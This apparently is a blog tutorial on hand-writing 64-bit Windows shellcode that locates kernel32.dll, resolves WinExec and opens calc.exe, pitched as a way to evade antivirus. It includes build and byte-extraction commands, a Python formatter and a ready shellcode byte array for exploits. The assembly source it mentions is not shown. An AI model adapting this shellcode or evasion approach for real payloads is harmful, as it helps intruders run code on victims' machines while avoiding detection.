<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Writing 64-bit Shellcode to Dynamically Resolve Kernel32.dll and Open calc.exe - MALD3V</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 20px;
            padding: 20px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            background-color: #ffffff;
        }
        h1 {
            color: #2d3748;
            margin-top: 0;
        }
        p {
            line-height: 1.8;
            color: #4a5568;
        }
        h2 {
            color: #2d3748;
            margin-top: 20px;
        }
        ul {
            line-height: 1.8;
            color: #4a5568;
            list-style-type: disc;
            margin-left: 20px;
        }
        pre {
            background-color: #f7f7f7;
            padding: 10px;
            border-radius: 8px;
            overflow-x: auto;
        }
        code {
            font-family: 'Courier New', Courier, monospace;
            font-size: 1em;
            color: #c7254e;
            background-color: #f9f2f4;
            padding: 2px 4px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <h1>Writing 64-bit Shellcode to Dynamically Resolve Kernel32.dll and Open calc.exe</h1>
    
    <p>
        When developing exploits, particularly for penetration testing or research, one common task is to inject shellcode into a vulnerable application. However, using tools like <code>msfvenom</code> to generate shellcode often results in payloads that are quickly flagged by antivirus software. This is because these generated shellcodes follow predictable patterns that modern AV engines are trained to detect. To overcome this challenge, we'll write our own custom 64-bit shellcode that dynamically resolves function addresses in <code>kernel32.dll</code> and opens <code>calc.exe</code>. This process not only avoids detection but also gives you more control over the shellcode's behavior.
    </p>

    <p>
        In this tutorial, we'll write the shellcode in assembly, compile it, and later extract the raw shellcode bytes for use in our exploits.
    </p>

    <h2>The Challenge</h2>
    <p>
        Shellcode must be position-independent, meaning it can execute correctly regardless of where in memory it is placed. Additionally, it needs to dynamically resolve necessary function addresses at runtime, as hardcoding addresses is unreliable across different systems. This ensures that the shellcode is both flexible and stealthy.
    </p>

    <h2>The Solution</h2>
    <p>
        We'll create shellcode that:
    </p>
    <ul>
        <li>Dynamically resolves the base address of <code>kernel32.dll</code>.</li>
        <li>Locates the address of <code>WinExec</code> using the Export Address Table.</li>
        <li>Calls <code>WinExec</code> to open <code>calc.exe</code>.</li>
        <li>Cleans up by calling <code>ExitProcess</code> to exit gracefully.</li>
    </ul>

    <h2>Prerequisites</h2>
    <p>
        To compile and run this assembly code, you will need the following:
    </p>
    <ul>
        <li><strong>NASM (Netwide Assembler):</strong> A popular assembler used for writing assembly code.</li>
        <li><strong>Microsoft Visual Studio:</strong> Specifically, the <code>link.exe</code> tool provided by Visual Studio is required to link the assembled object file into an executable.</li>
    </ul>

    <h2>Compilation Commands</h2>
    <p>
        Once you have written the assembly code in a file (e.g., <code>shellcode.asm</code>), you can compile and link it using the following commands:
    </p>

    <pre><code>nasm -f win64 shellcode.asm -o shellcode.o
link /SUBSYSTEM:CONSOLE /MACHINE:X64 /ENTRY:_start shellcode.o /OUT:shellcode.exe
    </code></pre>

    <p>
        These commands will produce an executable (<code>shellcode.exe</code>) that, when run, will open <code>calc.exe</code>.
    </p>

    <h2>Extracting the Shellcode</h2>
    <p>
        To extract the raw shellcode from the compiled executable, we can use the following technique. First, run this command:
    </p>

    <pre><code>dumpbin /headers shellcode.exe</code></pre>

    <p>
        You will see an output that includes a section similar to this:
    </p>

    <pre><code>SECTION HEADER #1
   .text name
     115 virtual size
    1000 virtual address (0000000140001000 to 0000000140001114)
     200 size of raw data
     400 file pointer to raw data (00000400 to 000005FF)
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
60000020 flags
         Code
         Execute Read
    </code></pre>

    <p>
        Converting these numbers to decimal, this means we need to extract 277 (0x115) bytes beginning at offset 1024 (0x400) in the file. You can extract this with the following command:
    </p>

    <pre><code>dd if=shellcode.exe of=shellcode.bin bs=1 count=277 skip=1024</code></pre>

    <p>
        Now we have a file <code>shellcode.bin</code> containing our shellcode. Next, we can convert it to a hexadecimal format that can be easily copied into a C program. Hereâ€™s a Python script to do that:
    </p>

    <pre><code>import sys

def bin_to_shellcode(bin_file_path):
    with open(bin_file_path, "rb") as bin_file:
        binary_data = bin_file.read()

    # Convert each byte to a "\x" formatted string
    shellcode = '\\x' + '\\x'.join(f'{byte:02x}' for byte in binary_data)
    
    # Split the shellcode into lines of maximum 16 bytes (32 characters for hex)
    max_bytes_per_line = 16
    lines = [shellcode[i:i+max_bytes_per_line*4] for i in range(0, len(shellcode), max_bytes_per_line*4)]

    # Format it into a C array
    formatted_shellcode = 'unsigned char shellcode[] = \n"' + '"\n"'.join(lines) + '";'
    
    return formatted_shellcode

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script_name.py <path_to_bin_file>")
        sys.exit(1)

    bin_file_path = sys.argv[1]
    shellcode = bin_to_shellcode(bin_file_path)
    print(shellcode)
    </code></pre>

    <p>
        Running this script on <code>shellcode.bin</code> will output something like the following:
    </p>

    <pre><code>unsigned char shellcode[] =
"\x48\x83\xec\x28\x48\x8d\x15\x02\x20\x00\x00\x48\x8d\x0d\xee\x1f"
"\x00\x00\xe8\x45\x00\x00\x00\x49\x89\xc7\x48\x8d\x0d\xdf\x1f\x00"
"\x00\xff\xd0\x48\x8d\x15\xf0\x1f\x00\x00\x48\x8d\x0d\xcf\x1f\x00"
"\x00\xe8\x26\x00\x00\x00\x48\x8d\x0d\xe5\x1f\x00\x00\xba\x01\x00"
"\x00\x00\xff\xd0\x48\x8d\x15\xe0\x1f\x00\x00\x48\x8d\x0d\xae\x1f"
"\x00\x00\xe8\x05\x00\x00\x00\x48\x31\xc9\xff\xd0\x48\x83\xec\x28"
"\x65\x4c\x8b\x04\x25\x60\x00\x00\x00\x4d\x8b\x40\x18\x4d\x8d\x60"
"\x10\x4d\x8b\x04\x24\xfc\x49\x8b\x78\x60\x48\x89\xce\xac\x84\xc0"
"\x74\x23\x8a\x27\x80\xfc\x61\x7c\x03\x80\xec\x20\x38\xc4\x75\x08"
"\x48\xff\xc7\x48\xff\xc7\xeb\xe5\x4d\x8b\x00\x4d\x39\xe0\x75\xd6"
"\x48\x31\xc0\xeb\x6b\x49\x8b\x58\x30\x44\x8b\x4b\x3c\x49\x01\xd9"
"\x49\x81\xc1\x88\x00\x00\x00\x45\x8b\x29\x4d\x85\xed\x74\x51\x4e"
"\x8d\x04\x2b\x45\x8b\x71\x04\x4d\x01\xee\x41\x8b\x48\x18\x45\x8b"
"\x50\x20\x49\x01\xda\xff\xc9\x4d\x8d\x0c\x8a\x41\x8b\x39\x48\x01"
"\xdf\x48\x89\xd6\xa6\x75\x08\x8a\x06\x84\xc0\x74\x09\xeb\xf5\xe2"
"\xe6\x48\x31\xc0\xeb\x1a\x45\x8b\x48\x24\x49\x01\xd9\x66\x41\x8b"
"\x0c\x49\x45\x8b\x48\x1c\x49\x01\xd9\x41\x8b\x04\x89\x48\x01\xd8"
"\x48\x83\xc4\x28\xc3";
    </code></pre>

    <p>
        This shellcode can now be used in your C programs or further tested in your exploits.
    </p>

</body>
</html>
